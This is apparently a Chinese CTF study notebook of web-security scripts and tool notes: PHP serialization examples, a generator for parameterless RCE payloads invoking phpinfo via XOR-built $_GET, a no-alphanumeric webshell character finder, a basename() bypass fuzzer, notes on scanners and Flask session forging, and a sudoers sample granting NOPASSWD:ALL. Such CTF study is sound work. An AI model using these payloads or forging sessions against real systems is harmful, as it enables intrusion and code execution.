## 一些脚本

### 1、前6个字符的md5值等于6d0bc1的脚本

```python
import hashlib
def md5(s):
    return hashlib.md5(s.encode('utf-8')).hexdigest()
for i in range(1, 10000000):
    if md5(str(i)).startswith('6d0bc1'):
        print(i)
        break
```

### 2、urlsplit不处理NFKC标准化案例

```python
from urllib.parse import urlsplit, urlunsplit, unquote
from urllib import parse

url = "file:////suctf.cc/usr/local/nginx/conf/nginx.conf"
parts = parse.urlsplit(url)
print(parts)

url2 = urlunsplit(parts)
parts2 = parse.urlsplit(url2)

print(parts2)

<结果>
SplitResult(scheme='file', netloc='', path='//suctf.cc/usr/local/nginx/conf/nginx.conf', query='', fragment='')
SplitResult(scheme='file', netloc='suctf.cc', path='/usr/local/nginx/conf/nginx.conf', query='', fragment='')

```

### 3、PHP序列化案例

#### 1、简单数组案例

```php
<?php
$user=array('xiao','shi','zi');
$user=serialize($user);
echo($user.PHP_EOL);
print_r(unserialize($user));

```

**输出**

```php
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
Array
(
    [0] => xiao
    [1] => shi
    [2] => zi
)
```

**解释**

```php
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
a:array代表是数组，后面的3说明有三个属性
i:代表是整型数据int，后面的0是数组下标
s:代表是字符串，后面的4是因为xiao长度为4
    
依次类推
```

#### 2、只有成员变量，没有成员函数案例

```php
<?php
class test{
    public $a;
    public $b;
    function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
    function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
?>
```

```php
O:4:"test":2:{s:1:"a";s:9:"xiaoshizi";s:1:"b";s:8:"laoshizi";}
```

#### 3、变量前是protected

>   会在变量名前加上`\x00*\x00`,
>
>   private则会在变量名前加上`\x00类名\x00`,输出时一般需要url编码，
>
>   若在本地存储更推荐采用base64编码的形式，如下：

```php
<?php
class test{
    protected  $a;
    private $b;
    function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
    function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
echo urlencode(serialize($a));
?>
```

**输出则会导致不可见字符`\x00`的丢失**

```php
O:4:"test":2:{s:4:" * a";s:9:"xiaoshizi";s:7:" test b";s:8:"laoshizi";}
```

### 4、无参数REC脚本

```php
<?php
$l = "";
$r = "";
$argv = str_split("_GET");  ##将_GET分割成一个数组，一位存一个值
for($i=0;$i<count($argv);$i++){   
    for($j=0;$j<255;$j++)
    {
        $k = chr($j)^chr(255);    ##进行异或         
        if($k == $argv[$i]){
            if($j<16){  ##如果小于16就代表只需一位即可表示，但是url要求是2位所以补个0
                $l .= "%ff";
                $r .= "%0" . dechex($j);
                continue;
            }
            $l .= "%ff";
            $r .= "%" . dechex($j);
            
        }
    }}
echo "\{$l^$r\}";  ### 这里的反引号只是用来区分左半边和右半边而已

# 构造出如下脚本
${%ff%ff%ff%ff`%a0%b8%ba%ab}{%A0}();&%A0=phpinfo
${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&%A0=phpinfo
##  1^2=2^1
## 这里值得注意的是${_GET}{%A0}就等于$_GET[%A0],
    # %A0是一个字符虽然没有被引号引起来但是php也不会将他看出是变量，
    # 这就是为什么&_GET[cmd]=&_GET["cmd"] 了。
## 还有一个特性是$a=phpinfo 如果执行$a() 就相当于执行了phpinfo()

```

### 5、python中16进制和str转换

```py
## 将一个十六进制字符串解码成一个字节字符串或者将一个字节字符串编码成一个十六进制字符串。
import base64
import binascii
s1=binascii.b2a_hex(b'mayi')  #只有bytes 可以被编码 ，返回bytes
s2=binascii.a2b_hex(b'6d617969') # 解码可以str也可bytes ，返回bytes
print(s1)
print(s2)
print(type(s2))
print(s2.decode('ascii'))

"""也可以直接使用base63模块的，只是它不支持小写16进制"""
# s3=base64.b16encode(b"234")  ## 只有bytes才可以被编码，返回bytes
# s4=base64.b16decode(b'323334')  ## 解码不要求其类型，返回bytes
# print(s3)
# print(s4)
# print(type(s3))
# print(s3.decode('ascii'))

"""直接将一个16进制转字符？似乎只能转bytes"""
# a=b"mayi"
# a=a.hex() ##转为16进制，必须要求a是bytes，返回结果为str 类型
# print(a)
# print(bytes.fromhex(a)) ##必须要求a是一个str，它的返回结果是一个bytes类型
```

### 6、无数字字母异或webshell脚本

>   获取想要字母：`localhost/test/?a=t`.
>
>   然后去异或：`$_=~('北'{1});`  -->  php7语法，php5不能这样
>
>   php5：`$___="瞰";  $a = ~($___{2});`

```php
<?php
header('Content-Type: text/html; charset=utf-8');
$str = '当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”';
for($i=0; $i<mb_strlen($str, 'utf-8'); $i++)
{
	$st = mb_substr($str, $i,1, 'utf-8');
	$a = ~($st);
	$b = $a[1];				#取汉字的第一位
	if($b==$_GET['a'])		#$_GET['a']想要得到的字符
	{
		echo $st;exit;
	}
	}
?>
  
```

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html





### 7、basement()忽略的字符脚本

```php
<?php
highlight_file(__FILE__);
$filename = 'index.php';
for($i=0; $i<255; $i++){
    $filename = $filename.'/'.chr($i);
    if(basename($filename) === "index.php"){
        echo $i.'<br>';
    }
    $filename = 'index.php';
}

```



## 一些工具使用

### 0、服务器中已有工具和环境

```
GitHack
php_mt_seed

python2.7
python3.6
python3.9

```



### 1、burpsuite

#### 1、intrude

-   **sniper模式：如果有多个变量，对每个变量依次进行破解，一次只替换一个变量，**
    -   例：有AB两个变量，先对A变量进行爆破，B不变，然后在B爆破，A不变
-   **Battering ram模式：对多个变量同时进行破解**
    -   例：对AB的值同时进行替换
-   **pitchfork模式：每个变量对应一个字典**
    -   例：比如AB，依次取其对应的字典中的一条数据对相应的变量替换，如果两个字典条数不一样，
    -   那么一共会执行条数较少的次数，不会交叉替换，只会按每个字典的顺序进行替换
-   **Cluster bomb：模式：把不同变量对应的字典中的值进行了排列组合，实现了不同的组合攻击**

### 2、php_mt_seed

-   **Ubuntu中有安装**（==**跑结果需要php版本：7.0.9以下**==）

-   ```
    命令：./php_mt_seed 1219893521
    ```

### 3、GitHack

```nginx
-- 获取git代码
python GitHack.py http-url

-- 查看代码所有提交记录
git log --reflog

-- 恢复代码
git reset 名称
或
git reset --hard 名称
```

### 4、dirsearch

web目录扫描工具

**需要Python3.7以上的运行环境**

-   -u：指定url
-   -e：指定需要扫描的文件名，如：-e php
-   -x：排除响应状态
-   -w：指定自定义字典路径



### 5、dirmap

web目录嗅探工具，基于python3开发、运行

```nginx
pip install -r requirements.txt   # 安装dirmap的库
```

```nginx
python3 dirmap.py -i https://target.com -lcf

-x：排除的响应码
-w：指定字典
-e：指定扫描的文件类型
-timeout：延时

```



### 6、gobuster

>   `Gobuster` 是一个开源工具，主要用于网站目录扫描和子域名收集
>
>   ```nginx
>   安装：apt-get install gobuster
>   ```

-   `-u` : –url 网站的域名或者IP
-   `-w` : 用户自定义字典
-   `-x` : 自定义文件类型如`php` `jsp`

```nginx
gobuster dir -u http: -w /usr/share/wordlists/dirb/big.txt -x php
```



### 7、[Arjun](https://www.ddosi.org/arjun/)

**一款http参数扫描器，主要就是爆破url参数的**

```nginx
git clone https://github.com/s0md3v/Arjun.git
或
pip3 install arjun

最后
python3 setup.py install
```

**使用方法**

-   -**u：针对单个url进行扫描**

    -   ```
        arjun -u https://api.example.com/endpoint
        ```
-   -d：请求之间的延迟
-   -m：指定http的请求方法
-   -c：控制查询块大小

    -   ```nginx
        默认情况下，Arjun 在请求中包含 500 个参数，
        这些参数有时会超过某些服务器的最大 URL 长度限制。
        -c您可以通过指定一次发送的参数数量来处理此类情况
        
        arjun -u https://api.example.com/endpoint -c 250
        ```
    -   可以设置为：**GET/POST/JSON/XML**

-   -i： 支持从 BurpSuite、简单文本文件和原始请求文件导入目标，会自动识别

    -   ```
        arjun -i targets.txt
        ```

-   导出结果：选项：`-oJ/-oB/-oT`

    -   ```nginx
        arjun -u https://api.example.com/endpoint -oJ result.json
        ```

-   指定注入点

    -   ```nginx
        arjun -u https://api.example.com/endpoint -m JSON --include='{"root":{"a":"b",$arjun$}}'
        ```

        ```nginx
        arjun -u https://api.example.com/endpoint -m XML --include='<?xml><root>$arjun$</root>'
        ```

-   -t：多线程

-   -T：请求超时时间，默认15

-   --include：请求时添加上秘钥

    -   ```nginx
        arjun  -u https://api.example.com/endpoint --include 'api_key=xxxxx'
        ```

-   --disable-redirects：禁用重定向

-   --stable：处理速率限制，将线程数设置为`1`并在请求之间引入 6 到 12 秒的随机延迟

-   --headers：自定义http标头

    -   ```nginx
        arjun -u https://api.example.com/endpoint --headers "Accept-Language: en-US\nCookie: null"
        ```

        

### 8、vulhub

**Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，**

**简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。**

**旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。**

>   **依赖docker环境**
>
>   安装docker文章查看：

```nginx
使用命令：
进入一个目录例如：vulhub/activemq/cve-2016-3088/
运行命令： docker-compose up -d （推荐）或者 docker-compose build
```

### 9、flask_session_cookie_manmager2.py

代表题目：[HDCTF 2023]YamiYami

-   **这是一个flask_session伪造工具**

-   使用方法：

-   ```nginx
    python2 脚本2.py decode -c "session值" -s "key值"
    python2 脚本2.py encode -s "key值" -t "我们需要伪造的值"
    python3 脚本3.py decode -c "session值" -s "key值"
    python3 脚本3.py encode -s "key值" -t "我们需要伪造的值"
    ```

    

### 10、Python-dsstore-master

**DS_Store文件解析工具**

```nginx
python main.py DS_Store
```





### 11、wireshard

>   流量分析工具







### 12、Wappalyzer

> 网站分析工具，**了解网站是用什么构建的**

- 网站分析：了解网站是用什么构建的，使用到的技术有哪些；
- 网站监控：监测网站技术的变化；
- 浏览器扩展：直接在访问的当前网站上查看所使用的技术；
- API访问：自动化技术查找，即时技术查询和网站实时抓取分析，快速查看结果；
- 安全侦察：揭示 Web 技术和版本号。





## 一些配置文件详解

### 1、/etc/sudoers（具有sudo用户权限的用户文件）

```nginx
#
# 此文件必须以 root 身份使用“visudo”命令进行编辑	
#
# 
#
# 请考虑在 /etc/sudoers.d/ 中添加本地内容，而不是直接修改此文件
#
# 
# 有关如何编写 sudoers 文件的详细信息，请参见手册页。
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification[主机别名规范]

# User alias specification[用户别名规范]

# Cmnd alias specification[Cmnd 别名规范]

# User privilege specification[用户权限规范]
root    ALL=(ALL:ALL) ALL

# admin 组的成员可以获得 root 权限
%admin ALL=(ALL) ALL

# 允许组 sudo 的成员执行任何命令
%sudo   ALL=(ALL:ALL) ALL

# 有关“#include”指令的更多信息，请参见 sudoers(5)：

#includedir /etc/sudoers.d[包含目录/etc/sudoers.d]
admin ALL=(ALL)  NOPASSWD:ALL
```